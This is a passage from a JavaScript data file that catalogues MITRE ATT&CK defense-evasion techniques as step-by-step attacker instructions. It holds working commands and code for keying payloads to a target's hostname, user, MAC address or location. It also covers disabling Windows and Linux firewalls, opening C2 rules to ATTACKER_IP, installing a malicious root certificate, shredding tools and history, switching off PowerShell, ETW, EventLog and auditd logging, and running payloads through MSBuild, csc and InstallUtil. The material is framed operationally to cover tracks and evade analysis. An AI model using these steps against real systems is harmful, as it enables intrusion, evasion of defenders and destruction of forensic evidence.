        "AES-encrypted payload decryption:\n> var key = Encoding.UTF8.GetBytes('SecretKey1234567');\n> var iv = Encoding.UTF8.GetBytes('InitVector12345!');\n> using var aes = Aes.Create();\n> aes.Key = key; aes.IV = iv;\n> var decryptor = aes.CreateDecryptor();\n> var decrypted = decryptor.TransformFinalBlock(encryptedPayload, 0, encryptedPayload.Length);\n# Decrypt payload from embedded encrypted blob"
      ]
    },
    {
      name: "Execution Guardrails",
      id: "T1480",
      summary: "Environment keying • sandbox detection • target fingerprint • anti-analysis",
      description: "Prevent execution in non-target environments to avoid analysis and attribution",
      tags: ["execution guardrails", "environment keying", "anti-analysis", "T1480"],
      steps: [
        "Domain/hostname check (execution keying):\n> string hostname = System.Net.Dns.GetHostName();\n> if (!hostname.EndsWith(\".target.com\")) Environment.Exit(0);\n# Only execute in target domain environment\n# Prevents execution in sandboxes and wrong targets",
        "Username and workstation keying:\n> if (Environment.UserName != 'jdoe' && !Environment.MachineName.StartsWith('WORKSTATION')) Environment.Exit(0);\n# Execute only for specific targeted user\n# Specific targeting prevents analysis",
        "Time-based execution guardrail:\n> var now = DateTime.UtcNow;\n> var start = new DateTime(2025, 1, 15);\n> var end = new DateTime(2025, 1, 20);\n> if (now < start || now > end) Environment.Exit(0);\n# Only execute during operation window\n# Expires after operation to prevent late analysis",
        "Geographic/IP-based guardrail:\n> var response = new WebClient().DownloadString('https://api.ipify.org');\n> var geoResponse = new WebClient().DownloadString($'https://ipapi.co/{response}/country/');\n> if (geoResponse.Trim() != 'US') Environment.Exit(0);\n# Only execute if target IP is in expected country",
        "Hardware fingerprint keying:\n> var mac = NetworkInterface.GetAllNetworkInterfaces().FirstOrDefault()?.GetPhysicalAddress().ToString();\n> var targetMAC = 'AABBCCDDEEFF';\n> if (mac != targetMAC) Environment.Exit(0);\n# Payload only executes on specific hardware\n# Extremely targeted - will not run in any other environment"
      ]
    },
    {
      name: "Network Boundary Bridging",
      id: "T1599",
      summary: "Network address translation bypass • router compromise • firewall bypass • VPN bypass",
      description: "Bypass network boundary controls to enable communications or lateral movement across network segments",
      tags: ["NAT bypass", "firewall bypass", "network bridging", "T1599"],
      steps: [
        "Router/firewall ACL modification:\n# After compromising edge device, modify ACL rules\n# Allow additional protocols/ports for C2\n# Cisco IOS: ip access-list extended OUTSIDE\n# Remove denies for attacker IP ranges",
        "NAT rule modification:\n# Add PAT rule to allow inbound C2 traffic\n# Cisco: ip nat inside source static tcp INTERNAL_IP 4444 EXTERNAL_IP 443\n# Traffic appears to come from legitimate external IP",
        "Double-hop through compromised network device:\n# Compromise internet-facing router or UTM\n# Use it as proxy/pivot to internal network\n# Traffic appears as internal-to-internal from security perspective",
        "DNS split-horizon exploitation:\n# Modify split-horizon DNS on compromised DNS server\n# External DNS returns different IPs than internal DNS\n# Redirect external queries to internal resources",
        "MPLS/BGP manipulation:\n# Nation-state: manipulate BGP routing tables\n# Route victim's traffic through attacker AS\n# Passive interception of unencrypted traffic\n# Requires BGP peering relationship or ISP compromise"
      ]
    },
    {
      name: "File Deletion",
      id: "T1070.004",
      summary: "Shred files • secure delete • overwrite • wipe tools • rm -rf",
      description: "Delete attack tools and logs to remove forensic evidence after operations",
      tags: ["file deletion", "shred", "secure delete", "T1070"],
      steps: [
        "Secure file deletion on Linux:\n$ shred -vzn 3 /tmp/payload.sh\n# -v: verbose, -z: add zero pass, -n 3: 3 overwrite passes\n$ wipe -rf /tmp/collected_data/\n$ srm -rf /tmp/attack_tools/\n# These tools overwrite before deletion to prevent recovery",
        "Windows SDelete (Sysinternals):\n$ sdelete64.exe -p 7 C:\\Windows\\Temp\\payload.exe\n# 7-pass DoD wipe — unrecoverable\n$ sdelete64.exe -z C:  # Zero free space (removes file carving opportunity)\n# Cover tracks: delete all staging and tooling",
        "PowerShell file deletion:\n> Remove-Item C:\\Temp\\* -Recurse -Force\n> [System.IO.File]::WriteAllBytes('C:\\Temp\\payload.exe', (New-Object byte[] 0))  # Zero file\n> Remove-Item 'C:\\Temp\\payload.exe' -Force\n# Zero out before delete to prevent recovery",
        "Overwrite file content before deletion:\n$ python3 -c \"\nimport os\nf = open('/tmp/payload.sh', 'r+b')\nsize = os.path.getsize('/tmp/payload.sh')\nf.write(b'\\x00' * size)\nf.flush()\nos.fsync(f.fileno())\nf.close()\nos.remove('/tmp/payload.sh')\n\"",
        "Clear bash and PowerShell history:\n$ history -c && unset HISTFILE\n$ rm ~/.bash_history\n$ export HISTFILE=/dev/null\n# PowerShell:\n> Set-PSReadLineOption -HistorySaveStyle SaveNothing\n> Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction Ignore\n# Prevents forensic recovery of typed commands"
      ]
    },
    {
      name: "Disable or Modify System Firewall",
      id: "T1562.004",
      summary: "netsh advfirewall • iptables flush • ufw disable • Windows Firewall off",
      description: "Disable or modify host-based firewalls to allow C2 connections and tool execution",
      tags: ["firewall disable", "iptables", "netsh", "T1562"],
      steps: [
        "Disable Windows Firewall via netsh:\n$ netsh advfirewall set allprofiles state off\n$ netsh firewall set opmode disable  # Legacy command\n# Requires admin — instantly allows all inbound/outbound traffic",
        "Add specific allow rule instead of disabling:\n$ netsh advfirewall firewall add rule name='Allow C2' dir=out action=allow protocol=TCP remoteport=443 remoteip=ATTACKER_IP\n$ netsh advfirewall firewall add rule name='C2 Inbound' dir=in action=allow protocol=TCP localport=4444\n# Less suspicious than disabling entirely — specific rule",
        "Linux iptables flush:\n$ iptables -F  # Flush all rules\n$ iptables -X  # Delete user chains\n$ iptables -P INPUT ACCEPT\n$ iptables -P OUTPUT ACCEPT\n$ iptables -P FORWARD ACCEPT\n# Clear all iptables rules — open all ports",
        "Disable UFW (Ubuntu):\n$ ufw disable\n$ systemctl stop ufw && systemctl disable ufw\n# UFW: simplified iptables frontend on Debian/Ubuntu",
        "Disable firewalld (RHEL/CentOS):\n$ systemctl stop firewalld\n$ systemctl disable firewalld\n$ iptables -F\n# firewalld: RHEL/CentOS standard firewall service\n# After disabling: add iptables rule or leave open"
      ]
    },
    {
      name: "Weaken Encryption",
      id: "T1600",
      summary: "SSL inspection bypass • weak cipher force • certificate validation disable • PKI manipulation",
      description: "Weaken cryptographic protection on network devices or endpoints to enable traffic interception",
      tags: ["weak encryption", "SSL bypass", "TLS downgrade", "T1600"],
      steps: [
        "Force weak TLS ciphers on compromised server:\n# Modify nginx/Apache config to allow weak ciphers\n$ echo 'SSLCipherSuite DEFAULT:!kEECDH:!kDHE:!RC4:!AESGCM' >> /etc/apache2/ssl.conf\n$ systemctl restart apache2\n# Downstream connections use weaker cipher — easier to intercept",
        "Disable SSL certificate validation in apps:\n$ export PYTHONHTTPSVERIFY=0  # Python apps skip cert validation\n$ export NODE_TLS_REJECT_UNAUTHORIZED=0  # Node.js apps\n# Applications stop verifying server certificates\n# Allows MitM without valid cert",
        "Install malicious root certificate:\n$ certutil -addstore -enterprise Root attacker_ca.cer\n$ Import-Certificate -FilePath attacker_ca.cer -CertStoreLocation Cert:\\LocalMachine\\Root\n# All TLS connections to attacker domains appear valid\n# Corporate proxy with attacker cert: full TLS inspection",
        "Network device cipher downgrade:\n# Compromise router/switch, downgrade TLS policy\n$ ssh admin@router\n> ip ssl version TLS1.0\n# Force devices to use TLS 1.0 instead of 1.2/1.3\n# TLS 1.0 vulnerable to POODLE, BEAST attacks",
        "IPsec VPN key material theft:\n# Compromise VPN endpoint, extract PSK or certificate\n$ ike-scan --pskcrack -o capture.ike 192.168.1.1\n# IKEv1 aggressive mode: capture hash, crack PSK offline\n$ hashcat -m 5300 ike_hash.txt rockyou.txt"
      ]
    },
    {
      name: "Impair Command History Logging",
      id: "T1562.003",
      summary: "HISTFILE=/dev/null • PowerShell no log • ScriptBlock logging disable • audit log bypass",
      description: "Prevent command history and audit logging to reduce forensic evidence of attacker activity",
      tags: ["command history", "PowerShell logging", "audit bypass", "T1562"],
      steps: [
        "Disable PowerShell script block logging:\n$ reg add HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging /v EnableScriptBlockLogging /t REG_DWORD /d 0 /f\n$ reg add HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\Transcription /v EnableTranscripting /t REG_DWORD /d 0 /f\n# Disable all PowerShell auditing before running tooling",
        "Unix shell history evasion:\n$ export HISTFILE=/dev/null\n$ export HISTSIZE=0\n$ export HISTFILESIZE=0\n$ unset HISTFILE\n# Set before any commands — nothing logged\n# Per-command: prefix with space (if HISTIGNORE=' *')\n$  secret_command  # Leading space: not logged in bash",
        "ETW provider disable (PowerShell/Windows):\n# Disable ETW provider for PowerShell:\n> $provider = [Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider').GetField('etwProvider','NonPublic,Static').GetValue($null)\n> [Void]$provider.GetType().GetField('enabled','NonPublic,Instance').SetValue($provider, 0)\n# Completely disables ETW events from PowerShell session",
        "Disable Windows Event Logging service:\n$ net stop EventLog\n$ sc config EventLog start= disabled\n# Stopping EventLog: all security events stop recording\n# Also: modify audit policy:\n$ auditpol /set /category:'Logon/Logoff' /success:disable /failure:disable\n$ auditpol /set /subcategory:'Process Creation' /success:disable",
        "Linux audit (auditd) evasion:\n$ systemctl stop auditd\n$ auditctl -e 0  # Disable auditd enforcement\n$ rm /var/log/audit/audit.log\n# Or specifically exclude attacker binary:\n$ auditctl -a never,task\n# 'never,task' rule: exclude all task events from audit\n# Check: auditctl -l to verify rules"
      ]
    },
    {
      name: "Trusted Developer Utilities Proxy Execution",
      id: "T1127",
      summary: "MSBuild • csc.exe • Roslyn • rcsi.exe • dnx.exe",
      description: "Use trusted developer utilities to compile and execute payloads, bypassing application whitelisting",
      tags: ["MSBuild", "csc.exe", "Roslyn", "T1127"],
      steps: [
        "MSBuild for C# payload execution:\n> <?xml version=\"1.0\" encoding=\"utf-8\"?>\n> <Project xmlns=\"http://schemas.microsoft.com/developer/msbuild/2003\">\n>   <Target Name=\"Hello\">\n>     <ClassExample />\n>   </Target>\n>   <UsingTask TaskName=\"ClassExample\" TaskFactory=\"CodeTaskFactory\" AssemblyFile=\"C:\\Windows\\Microsoft.Net\\Framework\\v4.0.30319\\Microsoft.Build.Tasks.v4.0.dll\">\n>     <Task><Code Type=\"Class\" Language=\"cs\"><![CDATA[\n>       using System.Diagnostics;\n>       public class ClassExample : Microsoft.Build.Utilities.Task {\n>         public override bool Execute() {\n>           Process.Start(\"powershell.exe\", \"-enc BASE64\"); return true;\n>         }\n>       }\n>     ]]></Code></Task>\n>   </UsingTask>\n> </Project>\n$ msbuild.exe payload.xml\n# Signed Microsoft binary, compiles and runs C# inline",
        "csc.exe (C# compiler) direct compilation:\n> using System.Diagnostics; class P { static void Main() { Process.Start(\"cmd.exe\"); } }\n$ csc.exe /out:C:\\Windows\\Temp\\payload.exe payload.cs\n$ C:\\Windows\\Temp\\payload.exe\n# Compiles and executes arbitrary C# code",
        "Roslyn script execution:\n$ csi.exe payload.csx\n> // payload.csx - C# script\n> using System.Diagnostics;\n> Process.Start(\"powershell.exe\", \"-enc BASE64\");\n# C# interactive script - no compilation needed",
        "installutil.exe for shellcode execution:\n> [System.ComponentModel.RunInstallerAttribute(true)]\n> public class Sample : System.Configuration.Install.Installer {\n>     public override void Uninstall(System.Collections.IDictionary savedState) {\n>         // Shellcode execution here\n>     }\n> }\n$ C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe /logfile= /LogToConsole=false /U payload.exe\n# /U triggers Uninstall method, bypasses some AV",
        "regasm.exe / regsvcs.exe abuse:\n$ regasm.exe /U payload.dll\n$ regsvcs.exe payload.dll\n# Similar to installutil - executes code in .NET assembly\n# Signed Microsoft binaries - often whitelisted"
      ]
    }
  ]
};